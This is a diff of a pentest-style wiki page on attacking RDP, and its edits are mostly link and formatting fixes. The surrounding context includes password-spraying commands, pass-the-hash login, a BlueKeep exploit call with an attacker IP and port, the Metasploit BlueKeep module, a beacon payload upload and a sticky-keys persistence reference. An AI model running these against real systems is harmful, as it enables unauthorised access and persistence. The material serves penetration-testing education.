@@ -57,17 +57,13 @@ netexec rdp <IP> -u <userlist> -p 'password123'
 netexec rdp 10.10.10.0/24 -u <userlist> -p 'password123'
 ```
 {% endtab %}
-
-{% tab title="Connect" %}
-
-{% endtab %}
 {% endtabs %}
 
 ### Logging in <a href="#id-00ef" id="id-00ef"></a>
 
 {% tabs %}
 {% tab title="XfreeRDP" %}
-We can use [xfreerdp ](https://linux.die.net/man/1/xfreerdp)to connect into a RDP server with known credentials or using [Pass the hash](../../../ad/movement/ntlm/pth.md) technique.
+We can use [xfreerdp ](https://linux.die.net/man/1/xfreerdp)to connect into a RDP server with known credentials or using [Pass the hash](../../ad/movement/ntlm/pth.md) technique.
 
 ```bash
 #With credentials 
@@ -118,9 +114,9 @@ SharpRDP.exe computername=dc01 command=calc username=offense\administrator passw
 
 ### Vulnerabilities
 
-#### MS12-020  (CVE-2012-0152)
+#### MS12-020 (CVE-2012-0152)
 
-This CVE address a denial of service (DOS) vulnerability in the Remote Desktop Service.&#x20;
+This CVE address a denial of service (DOS) vulnerability in the Remote Desktop Service.
 
 {% tabs %}
 {% tab title="Enumerate" %}
@@ -166,7 +162,7 @@ If the target uses RDP and the Windows version is mentioned above, it is vulnera
 nmap -O -p 3389 <TARGET_IP>
 ```
 
-Alternatively, we can use the [rdp\_detect\_info.py](https://github.com/worawit/CVE-2019-0708) from worawit github to detect the vulnerability&#x20;
+Alternatively, we can use the [rdp\_detect\_info.py](https://github.com/worawit/CVE-2019-0708) from worawit github to detect the vulnerability
 
 ```bash
 python rdp_detect_info.py <TARGET_IP>
@@ -210,7 +206,7 @@ python exploit.py <TARGET_IP> -rp <RDP_PORT> <ATTACKING_IP> -bp <ATTACKING_PORT>
 {% endtab %}
 
 {% tab title="Exploit - Metasploit" %}
-We can easily exploit this vulnerability using a metasploit frameworks&#x20;
+We can easily exploit this vulnerability using a metasploit frameworks
 
 ```bash
 msf> use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
@@ -347,8 +343,8 @@ beacon> upload C:\Payloads\pivot.exe
 
 Using **stickykeys** or **utilman** as a persistence vetcor, you will be able to access a administrative CMD and any RDP session anytime
 
-{% content-ref url="../../persistence/windows/accessibility-features-backdoor.md" %}
-[accessibility-features-backdoor.md](../../persistence/windows/accessibility-features-backdoor.md)
+{% content-ref url="../../redteam/persistence/windows/accessibility-features-backdoor.md" %}
+[accessibility-features-backdoor.md](../../redteam/persistence/windows/accessibility-features-backdoor.md)
 {% endcontent-ref %}
 
 ## Resources
